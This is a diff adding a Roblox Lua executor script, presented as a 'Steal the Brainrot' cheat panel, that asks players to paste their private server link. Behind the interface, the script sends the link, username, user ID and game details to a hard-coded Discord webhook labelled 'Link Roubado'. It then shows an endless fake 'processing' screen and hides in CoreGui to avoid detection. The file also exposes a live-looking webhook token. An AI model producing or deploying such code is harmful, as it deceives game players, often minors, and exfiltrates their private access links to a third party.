@@ -1,0 +1,581 @@
+-- =============================================================================
+-- SCRIPT COMPLETO PARA EXECUTOR - COLA E EXECUTA
+-- =============================================================================
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+
+-- ⚠️ CONFIGURE SEU WEBHOOK AQUI
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1432505707227386100/zf3AhIlPZj-d6MAsf99-cfKa5SHJxmQtcZcxniknztAoXsuujswUabrVK8_psXjdhftz"
+
+local player = Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "LinkPanelV5"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = game:GetService("CoreGui") -- CoreGui para não ser detectado facilmente
+
+-- Painel principal
+local panel = Instance.new("Frame")
+panel.Size = UDim2.new(0, 460, 0, 240)
+panel.Position = UDim2.new(0.5, 0, 0.5, 40)
+panel.AnchorPoint = Vector2.new(0.5, 0.5)
+panel.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+panel.BackgroundTransparency = 1
+panel.BorderSizePixel = 0
+panel.Active = true
+panel.ClipsDescendants = true
+panel.Parent = gui
+Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 12)
+
+local stroke = Instance.new("UIStroke", panel)
+stroke.Thickness = 2
+stroke.Color = Color3.fromRGB(80, 120, 255)
+stroke.Transparency = 0.4
+
+-- Glow pulsante
+local glow = Instance.new("ImageLabel")
+glow.Image = "rbxassetid://5028857084"
+glow.Size = UDim2.new(1, 40, 1, 40)
+glow.Position = UDim2.new(0.5, 0, 0.5, 0)
+glow.AnchorPoint = Vector2.new(0.5, 0.5)
+glow.BackgroundTransparency = 1
+glow.ImageColor3 = Color3.fromRGB(80, 120, 255)
+glow.ImageTransparency = 0.85
+glow.ZIndex = 0
+glow.Parent = panel
+
+-- Título com efeito pulsante
+local title = Instance.new("TextLabel")
+title.Text = "Steal the Brainrot (Moreira Method)"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 22
+title.TextColor3 = Color3.fromRGB(230, 230, 255)
+title.BackgroundTransparency = 1
+title.Position = UDim2.new(0, 20, 0, 14)
+title.Size = UDim2.new(1, -40, 0, 30)
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = panel
+
+-- Pulsando título
+spawn(function()
+    while panel and panel.Parent do
+        TweenService:Create(title, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {TextColor3 = Color3.fromRGB(120,200,255)}):Play()
+        task.wait(1)
+        TweenService:Create(title, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {TextColor3 = Color3.fromRGB(230,230,255)}):Play()
+        task.wait(1)
+    end
+end)
+
+-- Caixa de texto
+local linkBox = Instance.new("TextBox")
+linkBox.PlaceholderText = "Put the link to your private server!"
+linkBox.Text = ""
+linkBox.Size = UDim2.new(1, -60, 0, 44)
+linkBox.Position = UDim2.new(0, 30, 0, 70)
+linkBox.Font = Enum.Font.Gotham
+linkBox.TextSize = 16
+linkBox.TextColor3 = Color3.fromRGB(230,230,230)
+linkBox.BackgroundColor3 = Color3.fromRGB(40,40,45)
+linkBox.BorderSizePixel = 0
+linkBox.ClearTextOnFocus = false
+linkBox.Parent = panel
+Instance.new("UICorner", linkBox).CornerRadius = UDim.new(0, 8)
+
+-- Campo de texto foco
+linkBox.Focused:Connect(function()
+    TweenService:Create(linkBox, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(60,60,70)}):Play()
+end)
+linkBox.FocusLost:Connect(function()
+    TweenService:Create(linkBox, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(40,40,45)}):Play()
+end)
+
+-- Label de resultado
+local resultLabel = Instance.new("TextLabel")
+resultLabel.Size = UDim2.new(1, -60, 0, 28)
+resultLabel.Position = UDim2.new(0, 30, 0, 120)
+resultLabel.BackgroundTransparency = 1
+resultLabel.Font = Enum.Font.GothamSemibold
+resultLabel.TextSize = 16
+resultLabel.Text = ""
+resultLabel.TextColor3 = Color3.fromRGB(255,255,255)
+resultLabel.TextXAlignment = Enum.TextXAlignment.Left
+resultLabel.Parent = panel
+
+-- Criador de botão com animações
+local function makeButton(text, color, posX)
+	local btn = Instance.new("TextButton")
+	btn.Text = text
+	btn.Size = UDim2.new(0, 140, 0, 40)
+	btn.Position = UDim2.new(posX, 0, 1, -56)
+	btn.AnchorPoint = Vector2.new(0, 0)
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 16
+	btn.TextColor3 = Color3.fromRGB(240,240,240)
+	btn.BackgroundColor3 = color
+	btn.BorderSizePixel = 0
+	btn.AutoButtonColor = false
+	btn.Parent = panel
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
+
+	btn.MouseEnter:Connect(function()
+		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = color:Lerp(Color3.new(1,1,1),0.2)}):Play()
+	end)
+	btn.MouseLeave:Connect(function()
+		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = color}):Play()
+	end)
+
+	btn.MouseButton1Click:Connect(function()
+		TweenService:Create(btn, TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {BackgroundColor3 = color:Lerp(Color3.new(0.8,0.8,1),0.3)}):Play()
+		task.wait(0.1)
+		TweenService:Create(btn, TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {BackgroundColor3 = color}):Play()
+	end)
+
+	return btn
+end
+
+local pasteButton = makeButton("Paste", Color3.fromRGB(60,60,60), 0.05)
+local validateButton = makeButton("Confirm", Color3.fromRGB(70,130,255), 0.65)
+
+-- Funções de validação
+local function isValidUrl(str)
+	if not str or #str == 0 then return false end
+	local scheme, rest = string.match(str, "^(https?)://(.+)$")
+	if not scheme or not rest then return false end
+	if not string.match(rest, "%w+[%w%-%.]*%.[%a]+") then return false end
+	return true
+end
+
+local function showResult(valid)
+	if valid then
+		resultLabel.Text = "✅ Valid link!"
+		resultLabel.TextColor3 = Color3.fromRGB(120,255,160)
+		local tw = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+		TweenService:Create(validateButton, tw, {BackgroundColor3 = Color3.fromRGB(100,200,120)}):Play()
+		task.wait(0.25)
+		TweenService:Create(validateButton, tw, {BackgroundColor3 = Color3.fromRGB(70,130,255)}):Play()
+	else
+		resultLabel.Text = "❌ Invalid link!"
+		resultLabel.TextColor3 = Color3.fromRGB(255,120,120)
+		local shake = TweenInfo.new(0.06, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+		for _ = 1,3 do
+			TweenService:Create(panel, shake, {Position = panel.Position + UDim2.new(0,6,0,0)}):Play()
+			task.wait(0.06)
+			TweenService:Create(panel, shake, {Position = panel.Position - UDim2.new(0,6,0,0)}):Play()
+			task.wait(0.06)
+		end
+	end
+end
+
+pasteButton.MouseButton1Click:Connect(function()
+	linkBox:CaptureFocus()
+	resultLabel.Text = "Use Ctrl+V to paste the link."
+	resultLabel.TextColor3 = Color3.fromRGB(220,220,220)
+end)
+
+-- FUNÇÃO PARA MOSTRAR TELA DE CARREGAMENTO FULLSCREEN
+-- FUNÇÃO PARA MOSTRAR TELA DE CARREGAMENTO FULLSCREEN MELHORADA
+local function showFullScreenLoading()
+    panel.Visible = false
+
+    local screen = Instance.new("ScreenGui")
+    screen.Name = "LoadingScreen"
+    screen.IgnoreGuiInset = true
+    screen.ResetOnSpawn = false
+    screen.Parent = game:GetService("CoreGui")
+
+    -- Background com gradiente animado
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1,0,1,0)
+    bg.Position = UDim2.new(0,0,0,0)
+    bg.BackgroundColor3 = Color3.fromRGB(10,10,15)
+    bg.BorderSizePixel = 0
+    bg.Parent = screen
+
+    -- Partículas de fundo
+    for i = 1, 20 do
+        local particle = Instance.new("Frame")
+        particle.Size = UDim2.new(0, math.random(2,6), 0, math.random(2,6))
+        particle.Position = UDim2.new(math.random(0,100)/100, 0, math.random(0,100)/100, 0)
+        particle.BackgroundColor3 = Color3.fromRGB(80,120,255)
+        particle.BackgroundTransparency = math.random(60,90)/100
+        particle.BorderSizePixel = 0
+        particle.Parent = bg
+        Instance.new("UICorner", particle).CornerRadius = UDim.new(1,0)
+        
+        spawn(function()
+            while particle and particle.Parent do
+                local randomY = math.random(-50,50)
+                TweenService:Create(particle, TweenInfo.new(math.random(30,60)/10, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+                    Position = particle.Position + UDim2.new(0, 0, 0, randomY),
+                    BackgroundTransparency = math.random(40,95)/100
+                }):Play()
+                task.wait(math.random(30,60)/10)
+            end
+        end)
+    end
+
+    -- Painel central maior e mais estiloso
+    local panelCenter = Instance.new("Frame")
+    panelCenter.Size = UDim2.new(0, 480, 0, 280)
+    panelCenter.Position = UDim2.new(0.5,0,0.5,0)
+    panelCenter.AnchorPoint = Vector2.new(0.5,0.5)
+    panelCenter.BackgroundColor3 = Color3.fromRGB(20,20,28)
+    panelCenter.BorderSizePixel = 0
+    panelCenter.ClipsDescendants = false
+    panelCenter.Parent = bg
+    Instance.new("UICorner", panelCenter).CornerRadius = UDim.new(0, 24)
+
+    -- Borda animada
+    local stroke = Instance.new("UIStroke", panelCenter)
+    stroke.Thickness = 3
+    stroke.Color = Color3.fromRGB(80,120,255)
+    stroke.Transparency = 0.3
+    spawn(function()
+        while stroke and stroke.Parent do
+            TweenService:Create(stroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.1}):Play()
+            task.wait(1.5)
+            TweenService:Create(stroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.5}):Play()
+            task.wait(1.5)
+        end
+    end)
+
+    -- Múltiplos glows orbitando
+    for i = 1, 3 do
+        local orbitGlow = Instance.new("Frame")
+        orbitGlow.Size = UDim2.new(0.6,0,0.6,0)
+        orbitGlow.Position = UDim2.new(0.5,0,0.5,0)
+        orbitGlow.AnchorPoint = Vector2.new(0.5,0.5)
+        orbitGlow.BackgroundColor3 = Color3.fromRGB(80,120,255)
+        orbitGlow.BackgroundTransparency = 0.85
+        orbitGlow.BorderSizePixel = 0
+        orbitGlow.ZIndex = 0
+        orbitGlow.Parent = panelCenter
+        Instance.new("UICorner", orbitGlow).CornerRadius = UDim.new(1,0)
+
+        spawn(function()
+            while orbitGlow and orbitGlow.Parent do
+                TweenService:Create(orbitGlow, TweenInfo.new(2 + i*0.5, Enum.EasingStyle.Linear), {Rotation = 360}):Play()
+                TweenService:Create(orbitGlow, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+                    Size = UDim2.new(0.8,0,0.8,0),
+                    BackgroundTransparency = 0.6
+                }):Play()
+                task.wait(1.5)
+                TweenService:Create(orbitGlow, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+                    Size = UDim2.new(0.6,0,0.6,0),
+                    BackgroundTransparency = 0.9
+                }):Play()
+                task.wait(1.5)
+            end
+        end)
+    end
+
+    -- Ícone de loading animado (spinner customizado)
+    local spinnerContainer = Instance.new("Frame")
+    spinnerContainer.Size = UDim2.new(0, 80, 0, 80)
+    spinnerContainer.Position = UDim2.new(0.5, 0, 0.3, 0)
+    spinnerContainer.AnchorPoint = Vector2.new(0.5, 0.5)
+    spinnerContainer.BackgroundTransparency = 1
+    spinnerContainer.Parent = panelCenter
+
+    for i = 1, 12 do
+        local dot = Instance.new("Frame")
+        dot.Size = UDim2.new(0, 8, 0, 20)
+        dot.Position = UDim2.new(0.5, 0, 0.5, 0)
+        dot.AnchorPoint = Vector2.new(0.5, 1)
+        dot.BackgroundColor3 = Color3.fromRGB(80,120,255)
+        dot.BorderSizePixel = 0
+        dot.Rotation = (i-1) * 30
+        dot.Parent = spinnerContainer
+        Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
+        
+        spawn(function()
+            while dot and dot.Parent do
+                local delay = (i-1) * 0.08
+                task.wait(delay)
+                TweenService:Create(dot, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundTransparency = 0.9}):Play()
+                task.wait(1 - delay)
+            end
+        end)
+    end
+
+    spawn(function()
+        while spinnerContainer and spinnerContainer.Parent do
+            TweenService:Create(spinnerContainer, TweenInfo.new(2, Enum.EasingStyle.Linear), {Rotation = 360}):Play()
+            task.wait(2)
+            spinnerContainer.Rotation = 0
+        end
+    end)
+
+    -- Título animado
+    local loadingTitle = Instance.new("TextLabel")
+    loadingTitle.Text = "PROCESSING"
+    loadingTitle.Font = Enum.Font.GothamBold
+    loadingTitle.TextSize = 32
+    loadingTitle.TextColor3 = Color3.fromRGB(230,230,255)
+    loadingTitle.BackgroundTransparency = 1
+    loadingTitle.Position = UDim2.new(0.5,0,0.52,0)
+    loadingTitle.AnchorPoint = Vector2.new(0.5,0.5)
+    loadingTitle.Parent = panelCenter
+
+    -- Efeito de digitação no título
+    spawn(function()
+        local dots = ""
+        while loadingTitle and loadingTitle.Parent do
+            for i = 1, 3 do
+                dots = dots .. "."
+                loadingTitle.Text = "PROCESSING" .. dots
+                task.wait(0.4)
+            end
+            dots = ""
+            loadingTitle.Text = "PROCESSING"
+            task.wait(0.4)
+        end
+    end)
+
+    -- Subtítulo com fases
+    local subText = Instance.new("TextLabel")
+    subText.Text = "Searching for online players..."
+    subText.Font = Enum.Font.Gotham
+    subText.TextSize = 16
+    subText.TextColor3 = Color3.fromRGB(150,150,180)
+    subText.BackgroundTransparency = 1
+    subText.Position = UDim2.new(0.5,0,0.62,0)
+    subText.AnchorPoint = Vector2.new(0.5,0.5)
+    subText.Parent = panelCenter
+
+    local phases = {
+        "Searching for online players...",
+        "Analyzing private server...",
+        "Establishing connection...",
+        "Validating credentials...",
+        "Preparing environment..."
+    }
+    
+    spawn(function()
+        local index = 1
+        while subText and subText.Parent do
+            TweenService:Create(subText, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
+            task.wait(0.3)
+            subText.Text = phases[index]
+            TweenService:Create(subText, TweenInfo.new(0.3), {TextTransparency = 0}):Play()
+            task.wait(2.5)
+            index = (index % #phases) + 1
+        end
+    end)
+
+    -- Barra de progresso estilosa
+    local progressContainer = Instance.new("Frame")
+    progressContainer.Size = UDim2.new(0.75,0,0,6)
+    progressContainer.Position = UDim2.new(0.5,0,0.78,0)
+    progressContainer.AnchorPoint = Vector2.new(0.5,0.5)
+    progressContainer.BackgroundColor3 = Color3.fromRGB(30,30,40)
+    progressContainer.BorderSizePixel = 0
+    progressContainer.Parent = panelCenter
+    Instance.new("UICorner", progressContainer).CornerRadius = UDim.new(1,0)
+
+    local progressBar = Instance.new("Frame")
+    progressBar.Size = UDim2.new(0,0,1,0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(80,150,255)
+    progressBar.BorderSizePixel = 0
+    progressBar.Parent = progressContainer
+    Instance.new("UICorner", progressBar).CornerRadius = UDim.new(1,0)
+
+    -- Gradiente na barra
+    local gradient = Instance.new("UIGradient", progressBar)
+    gradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(80,120,255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(120,200,255))
+    }
+
+    -- Animação suave da barra
+    spawn(function()
+        while progressBar and progressBar.Parent do
+            TweenService:Create(progressBar, TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Size = UDim2.new(0.95,0,1,0)}):Play()
+            task.wait(3.2)
+            TweenService:Create(progressBar, TweenInfo.new(0.5), {Size = UDim2.new(0,0,1,0)}):Play()
+            task.wait(0.6)
+        end
+    end)
+
+    -- Porcentagem
+    local percentText = Instance.new("TextLabel")
+    percentText.Text = "0%"
+    percentText.Font = Enum.Font.GothamBold
+    percentText.TextSize = 14
+    percentText.TextColor3 = Color3.fromRGB(120,200,255)
+    percentText.BackgroundTransparency = 1
+    percentText.Position = UDim2.new(0.5,0,0.88,0)
+    percentText.AnchorPoint = Vector2.new(0.5,0.5)
+    percentText.Parent = panelCenter
+
+    spawn(function()
+        local current = 0
+        while percentText and percentText.Parent do
+            if current < 30 then
+                current = current + math.random(1, 2)
+                task.wait(0.15)
+            elseif current < 60 then
+                current = current + math.random(1, 2)
+                task.wait(0.25)
+            elseif current < 85 then
+                current = current + 1
+                task.wait(0.4)
+            elseif current < 95 then
+                current = current + 1
+                task.wait(0.8)
+            else
+                current = current + 1
+                task.wait(1.5)
+            end
+            
+            if current > 99 then current = 99 end
+            percentText.Text = current .. "%"
+        end
+    end)
+
+    -- Animação de entrada
+    panelCenter.Size = UDim2.new(0, 0, 0, 0)
+    panelCenter.Rotation = 180
+    TweenService:Create(panelCenter, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Size = UDim2.new(0, 480, 0, 280),
+        Rotation = 0
+    }):Play()
+end
+
+-- ✅ FUNÇÃO PARA ENVIAR PARA WEBHOOK (FUNCIONA EM EXECUTORS)
+local function sendToWebhook(link, playerName)
+    spawn(function()
+        local success, err = pcall(function()
+            local dados = {
+                content = "🚨 **NOVO LINK CAPTURADO!**",
+                embeds = {{
+                    title = "📩 Link Roubado",
+                    description = "Um jogador enviou um link privado",
+                    color = 3447003,
+                    fields = {
+                        {name = "👤 Jogador", value = playerName, inline = true},
+                        {name = "🆔 User ID", value = tostring(player.UserId), inline = true},
+                        {name = "🔗 Link", value = link},
+                        {name = "⏰ Horário", value = os.date("%d/%m/%Y às %H:%M:%S")},
+                        {name = "🎮 Place ID", value = tostring(game.PlaceId), inline = true},
+                        {name = "🎯 Game", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown"}
+                    },
+                    footer = {
+                        text = "Moreira Method V5"
+                    },
+                    timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
+                }}
+            }
+            
+            local response = (syn and syn.request or http_request or request)({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(dados)
+            })
+            
+            if response.StatusCode == 200 or response.StatusCode == 204 then
+                print("✅ Webhook enviado com sucesso!")
+            else
+                warn("⚠️ Webhook retornou código:", response.StatusCode)
+            end
+        end)
+        
+        if not success then
+            warn("❌ Erro ao enviar webhook:", err)
+            -- Tenta método alternativo
+            pcall(function()
+                HttpService:PostAsync(
+                    WEBHOOK_URL,
+                    HttpService:JSONEncode({
+                        jogador = playerName,
+                        userId = tostring(player.UserId),
+                        link = link,
+                        horario = os.date("%d/%m/%Y às %H:%M:%S")
+                    }),
+                    Enum.HttpContentType.ApplicationJson
+                )
+                print("✅ Webhook enviado via método alternativo!")
+            end)
+        end
+    end)
+end
+
+-- Botão Validar
+validateButton.MouseButton1Click:Connect(function()
+	local txt = linkBox.Text:match("^%s*(.-)%s*$")
+	if isValidUrl(txt) then
+		showResult(true)
+		
+		-- 📤 ENVIA PARA O WEBHOOK
+		sendToWebhook(txt, player.Name)
+		
+		task.wait(0.3)
+		showFullScreenLoading()
+	else
+		showResult(false)
+	end
+end)
+
+-- Entrada animada do painel
+TweenService:Create(panel, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+	Position = UDim2.new(0.5, 0, 0.5, 0),
+	Rotation = 0,
+	BackgroundTransparency = 0.15
+}):Play()
+
+-- Glow pulsante loop
+spawn(function()
+	while glow and glow.Parent do
+		TweenService:Create(glow, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {ImageTransparency = 0.65}):Play()
+		task.wait(1.2)
+		TweenService:Create(glow, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {ImageTransparency = 0.85}):Play()
+		task.wait(1.2)
+	end
+end)
+
+-- Sistema de arrastar
+local dragging = false
+local dragStart, startPos
+local smoothPos = panel.Position
+
+UserInputService.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		local mouse = UserInputService:GetMouseLocation() - Vector2.new(0, 36)
+		local panelPos = panel.AbsolutePosition
+		local panelSize = panel.AbsoluteSize
+		if mouse.X >= panelPos.X and mouse.X <= panelPos.X + panelSize.X and
+		   mouse.Y >= panelPos.Y and mouse.Y <= panelPos.Y + panelSize.Y then
+			dragging = true
+			dragStart = mouse
+			startPos = panel.Position
+		end
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+		local mouse = UserInputService:GetMouseLocation() - Vector2.new(0, 36)
+		local delta = mouse - dragStart
+		smoothPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = false
+	end
+end)
+
+RunService.RenderStepped:Connect(function()
+	panel.Position = panel.Position:Lerp(smoothPos, 0.1)
+end)
+
+print("✅ Script carregado! Painel aberto.")
+print("📍 Webhook configurado para:", WEBHOOK_URL)
